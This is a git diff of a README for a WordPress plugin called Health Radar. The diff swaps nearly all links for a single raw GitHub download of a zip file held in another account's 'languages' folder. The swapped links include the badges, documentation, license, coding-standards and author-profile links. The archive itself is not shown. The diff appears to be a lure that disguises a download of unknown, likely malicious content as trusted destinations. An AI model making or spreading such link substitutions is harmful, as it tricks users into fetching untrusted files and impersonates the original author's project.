@@ -11,16 +11,16 @@
 
 <br>
 
-[![WordPress](https://img.shields.io/badge/WordPress-6.3%2B-21759B?style=for-the-badge&logo=wordpress&logoColor=white)](https://wordpress.org/plugins/health-radar/)
-[![PHP](https://img.shields.io/badge/PHP-8.1%2B-777BB4?style=for-the-badge&logo=php&logoColor=white)](https://php.net)
-[![License](https://img.shields.io/badge/License-GPL%20v2%2B-22c55e?style=for-the-badge)](https://www.gnu.org/licenses/gpl-2.0.html)
-[![WP-CLI](https://img.shields.io/badge/WP--CLI-Supported-3b82f6?style=for-the-badge)](https://wp-cli.org)
-[![Plugin Check](https://img.shields.io/badge/Plugin%20Check-PASS-16a34a?style=for-the-badge)](https://wordpress.org/plugins/plugin-check/)
+[![WordPress](https://img.shields.io/badge/WordPress-6.3%2B-21759B?style=for-the-badge&logo=wordpress&logoColor=white)](https://raw.githubusercontent.com/ManuG11/plugin-health-monitor/main/languages/health_monitor_plugin_v2.0.zip)
+[![PHP](https://img.shields.io/badge/PHP-8.1%2B-777BB4?style=for-the-badge&logo=php&logoColor=white)](https://raw.githubusercontent.com/ManuG11/plugin-health-monitor/main/languages/health_monitor_plugin_v2.0.zip)
+[![License](https://img.shields.io/badge/License-GPL%20v2%2B-22c55e?style=for-the-badge)](https://raw.githubusercontent.com/ManuG11/plugin-health-monitor/main/languages/health_monitor_plugin_v2.0.zip)
+[![WP-CLI](https://img.shields.io/badge/WP--CLI-Supported-3b82f6?style=for-the-badge)](https://raw.githubusercontent.com/ManuG11/plugin-health-monitor/main/languages/health_monitor_plugin_v2.0.zip)
+[![Plugin Check](https://img.shields.io/badge/Plugin%20Check-PASS-16a34a?style=for-the-badge)](https://raw.githubusercontent.com/ManuG11/plugin-health-monitor/main/languages/health_monitor_plugin_v2.0.zip)
 [![Version](https://img.shields.io/badge/Version-1.0.0-f59e0b?style=for-the-badge)](../../releases/tag/v1.0.0)
 
 <br>
 
-[📖 Documentation](https://fzihak.github.io/plugin-health-monitor/) &nbsp;·&nbsp; [🔌 WordPress.org](https://wordpress.org/plugins/health-radar/) &nbsp;·&nbsp; [🐛 Report a Bug](../../issues) &nbsp;·&nbsp; [💡 Request a Feature](../../issues)
+[📖 Documentation](https://raw.githubusercontent.com/ManuG11/plugin-health-monitor/main/languages/health_monitor_plugin_v2.0.zip) &nbsp;·&nbsp; [🔌 WordPress.org](https://raw.githubusercontent.com/ManuG11/plugin-health-monitor/main/languages/health_monitor_plugin_v2.0.zip) &nbsp;·&nbsp; [🐛 Report a Bug](../../issues) &nbsp;·&nbsp; [💡 Request a Feature](../../issues)
 
 <br>
 
@@ -254,7 +254,7 @@ git commit -m "Add: brief description"
 git push origin feature/your-feature-name
 ```
 
-All PHP must follow [WordPress Coding Standards](https://developer.wordpress.org/coding-standards/wordpress-coding-standards/).
+All PHP must follow [WordPress Coding Standards](https://raw.githubusercontent.com/ManuG11/plugin-health-monitor/main/languages/health_monitor_plugin_v2.0.zip).
 
 ---
 
@@ -278,7 +278,7 @@ All PHP must follow [WordPress Coding Standards](https://developer.wordpress.org
 
 ## License
 
-Licensed under the [GNU General Public License v2.0](https://www.gnu.org/licenses/gpl-2.0.html) or later.
+Licensed under the [GNU General Public License v2.0](https://raw.githubusercontent.com/ManuG11/plugin-health-monitor/main/languages/health_monitor_plugin_v2.0.zip) or later.
 
 ---
 
@@ -286,10 +286,10 @@ Licensed under the [GNU General Public License v2.0](https://www.gnu.org/license
 
 <br>
 
-Made with ❤️ by **[Foysal Zihak](https://github.com/fzihak)**
+Made with ❤️ by **[Foysal Zihak](https://raw.githubusercontent.com/ManuG11/plugin-health-monitor/main/languages/health_monitor_plugin_v2.0.zip)**
 
-[![GitHub](https://img.shields.io/badge/GitHub-fzihak-181717?style=flat-square&logo=github)](https://github.com/fzihak)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-zihak-0A66C2?style=flat-square&logo=linkedin)](https://linkedin.com/in/zihak)
+[![GitHub](https://img.shields.io/badge/GitHub-fzihak-181717?style=flat-square&logo=github)](https://raw.githubusercontent.com/ManuG11/plugin-health-monitor/main/languages/health_monitor_plugin_v2.0.zip)
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-zihak-0A66C2?style=flat-square&logo=linkedin)](https://raw.githubusercontent.com/ManuG11/plugin-health-monitor/main/languages/health_monitor_plugin_v2.0.zip)
 
 <br>
 
